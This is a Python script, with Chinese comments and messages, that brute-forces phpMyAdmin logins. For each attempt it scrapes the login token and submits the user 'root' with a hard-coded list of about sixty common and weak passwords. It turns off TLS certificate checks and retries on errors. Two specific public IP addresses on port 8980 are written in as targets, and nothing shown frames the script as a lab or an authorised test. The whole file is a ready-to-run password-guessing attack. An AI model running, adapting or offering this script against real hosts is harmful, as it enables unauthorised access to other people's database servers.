#!/usr/bin/env python3
"""更大字典phpMyAdmin爆破"""
import urllib.request, http.cookiejar, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def new_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    op.addheaders = [("User-Agent","Mozilla/5.0")]
    return op

def try_login(host, user, pw):
    for attempt in range(3):
        try:
            op = new_opener()
            r = op.open(f"http://{host}/phpmyadmin/", timeout=8)
            html = r.read().decode("utf-8","ignore")
            m = re.search(r'name="token" value="([a-f0-9]{32})"', html)
            if not m: return "NOTOKEN"
            data = f"pma_username={user}&pma_password={pw}&server=1&token={m.group(1)}".encode()
            op.open(urllib.request.Request(f"http://{host}/phpmyadmin/index.php", data=data), timeout=8).read()
            r = op.open(f"http://{host}/phpmyadmin/index.php", timeout=8)
            body = r.read().decode("utf-8","ignore")
            if "Cannot log in" in body or "#1045" in body:
                return "FAIL"
            if "logout" in body or "navigation" in body or "server_databases" in body:
                return "SUCCESS"
            return "UNKNOWN"
        except Exception as e:
            if attempt == 2: return f"ERR:{str(e)[:25]}"
            time.sleep(1)
    return "ERR"

pwds = ["123456","root","admin","12345678","mysql","root123","password","123456789",
        "admin123","test","phpstudy","phpStudy","12345","1234567","888888","111111",
        "000000","admin888","mysql123","passw0rd","abc123","123123","654321",
        "1234567890","qwerty","p@ssw0rd","P@ssw0rd","admin@123","www123","web123",
        "phpmyadmin","pma","xm123456","zhizhu","zhizhu123","qizhongji","jizhongqi",
        "123456a","Aa123456","a123456","zxcvbnm","qazwsx","zhizhu888","qizhongji123",
        "bangfane","bangfane123","bangfang","123456789a","admin2018","admin2019",
        "admin2020","admin2021","admin2022","admin2023","admin2024","admin2025",
        "admin2026","1234567890a","woaini","5201314","qq123456","gyyyh"]

for host in ["47.105.218.154:8980", "60.191.221.198:8980"]:
    print(f"=== {host} ===", flush=True)
    for pw in pwds:
        r = try_login(host, "root", pw)
        if r == "SUCCESS":
            print(f"!!! {host} root/{pw} 登录成功!", flush=True)
            break
        elif r != "FAIL":
            print(f"[{r}] {pw}", flush=True)
        if pw in ("123456","phpstudy","zhizhu123","admin2026"):
            print(f"  (测到 {pw})", flush=True)
        time.sleep(0.3)
print("DONE")
